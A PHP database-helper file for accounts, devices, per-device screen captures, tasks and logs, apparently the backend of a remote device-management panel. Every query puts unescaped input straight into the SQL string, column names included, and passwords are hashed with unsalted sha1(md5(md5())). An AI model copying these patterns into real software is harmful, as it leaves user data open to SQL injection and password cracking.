<?php
function FindAccount($Username) {
    global $MySQLConnection;
    $Query = "SELECT * FROM `accounts` WHERE `Username` LIKE '$Username'";
    $Result = $MySQLConnection->query($Query);
    if ($Result->num_rows > 0) {
        return $Result->fetch_assoc();
    }
    return false;
}

function FindAccountbyID($ID) {
    global $MySQLConnection;
    $Query = "SELECT * FROM `accounts` WHERE `ID` LIKE '$ID'";
    $Result = $MySQLConnection->query($Query);
    if ($Result->num_rows > 0) {
        return $Result->fetch_assoc();
    }
    return false;
}

function FindAccountbyToken($Token) {
    global $MySQLConnection;
    $Query = "SELECT * FROM `accounts` WHERE `Token` LIKE '$Token'";
    $Result = $MySQLConnection->query($Query);
    if ($Result->num_rows > 0) {
        return $Result->fetch_assoc();
    }
    return false;
}

function AccountInfo($Token) {
    global $MySQLConnection;
    $Query = "SELECT * FROM `accounts` WHERE `Token` LIKE '$Token'";
    $Result = $MySQLConnection->query($Query);
    if ($Result->num_rows > 0) {
        return $Result->fetch_assoc();
    }
    return false;
}

function CreateAccount($Username, $Password, $Email, $Rank) {
    global $MySQLConnection;
    if (FindAccount($Username) == false) {
        $Query = "SELECT * from accounts";
        $ID = mysqli_num_rows(mysqli_query($MySQLConnection, $Query)) + 1;
        $Password = sha1(md5(md5($Password)));
        $Token = CreateToken($ID, $Username, $Password, $Email);
        $Query = "INSERT INTO `accounts`(`ID`, `Username`, `Password`, `Email`, `Devices`, `Token`) VALUES ('$ID','$Username','$Password','$Email','','$Token')";
        if (mysqli_query($MySQLConnection, $Query)) {
            return true;
        }
    }
    return false;
}

function UpdateAccount($ID, $Username, $Password, $Email, $Devices) {
    global $MySQLConnection;
    $Token = CreateToken($ID, $Username, $Password, $Email);
    $Query = "UPDATE `accounts` SET `Username`='$Username',`Password`='$Password',`Email`='$Email',`Devices`='$Devices',`Token`='$Token' WHERE ID = $ID;";
    if (mysqli_query($MySQLConnection, $Query)) {
        return true;
    }
    return false;
}

function UpdateAccountbyData($ID, $Set, $NewData) {
    global $MySQLConnection;
    $Query = "UPDATE `accounts` SET $Set='$NewData' WHERE ID='" . $ID . "'";
    if (mysqli_query($MySQLConnection, $Query)) {
        return true;
    }
    return false;
}

function DeleteAccount($ID) {
    global $MySQLConnection;
    $Query = "DELETE FROM `accounts` WHERE ID='" . $ID . "'";
    echo $Query;
    if (mysqli_query($MySQLConnection, $Query)) {
        return true;
    }
    return false;
}

function GetAccounts() {
    global $MySQLConnection;
    $Query = "SELECT * from accounts";
    $Result = $MySQLConnection->query($Query);
    if ($Result->num_rows > 0) {
        return $Result->fetch_all();
    }
    return false;
}

function FindDevice($ID) {
    global $MySQLConnection;
    $Query = "SELECT * FROM `devices` WHERE `ID` LIKE '$ID'";
    $Result = $MySQLConnection->query($Query);
    if ($Result->num_rows > 0) {
        return $Result->fetch_assoc();
    }
    return false;
}

function FindDevicesbyUserID($UserID) {
    global $MySQLConnection;
    $Query = "SELECT * FROM `devices` WHERE `UserID` LIKE '$UserID'";
    $Result = $MySQLConnection->query($Query);
    if ($Result->num_rows > 0) {
        return $Result->fetch_all();
    }
    return false;
}

function CreateDevice($UserID, $Hwid, $LastSeen, $HardwareInfo, $ClientInfo, $Task) {
    global $MySQLConnection;
    $Query = "SELECT * from devices";
    $ID = mysqli_num_rows(mysqli_query($MySQLConnection, $Query)) + 1;
    $Query = "INSERT INTO `devices`(`ID`, `UserID`, `Hwid`, `LastSeen`, `HardwareInfo`, `ClientInfo`, `Task`) VALUES ('$ID','$UserID','$Hwid','$LastSeen','$HardwareInfo','$ClientInfo','$Task')";
    if (mysqli_query($MySQLConnection, $Query)) {
        return $ID;
    }
    return false;
}

function UpdateDevicebyData($ID, $Set, $NewData) {
    global $MySQLConnection;
    $Query = "UPDATE `devices` SET $Set='$NewData' WHERE ID='" . $ID . "'";
    if (mysqli_query($MySQLConnection, $Query)) {
        return true;
    }
    return false;
}

function UpdateScreen($UserID, $DeviceID, $Data) {
    global $MySQLConnection;
    $LastDataTime = strtotime("now");
    $Query = "SELECT * FROM `screens` WHERE `DeviceID` LIKE '$DeviceID'";
    $Result = $MySQLConnection->query($Query);
    if ($Result->num_rows > 0) {
        $Query = "UPDATE `screens` SET Data='$Data', LastDataTime='$LastDataTime' WHERE DeviceID='" . $DeviceID . "'";
        if (mysqli_query($MySQLConnection, $Query)) {
            return true;
        }
        return false;
    } else {
        $Query = "INSERT INTO `screens`(`UserID`, `DeviceID`, `Data`, `LastDataTime`) VALUES ('$UserID','$DeviceID','$Data','$LastDataTime')";
        if (mysqli_query($MySQLConnection, $Query)) {
            return true;
        }
        return false;
    }
}

function FindScreen($DeviceID) {
    global $MySQLConnection;
    $Query = "SELECT * FROM `screens` WHERE `DeviceID` LIKE '$DeviceID'";
    $Result = $MySQLConnection->query($Query);
    if ($Result->num_rows > 0) {
        return $Result->fetch_assoc();
    }
    return false;
}

function CreateLog($UserID, $DeviceID, $Log) {
    global $MySQLConnection;
    $Time = strtotime("now");
    $Query = "INSERT INTO `logs`(`UserID`, `DeviceID`, `Log`, `Time`) VALUES ('$UserID','$DeviceID','$Log','$Time')";
    if (mysqli_query($MySQLConnection, $Query)) {
        return true;
    }
    return false;
}

function FindLogs($DeviceID) {
    global $MySQLConnection;
    $Query = "SELECT * FROM `logs` WHERE `DeviceID` LIKE '$DeviceID'";
    $Result = $MySQLConnection->query($Query);
    if ($Result->num_rows > 0) {
        return $Result->fetch_all();
    }
    return false;
}
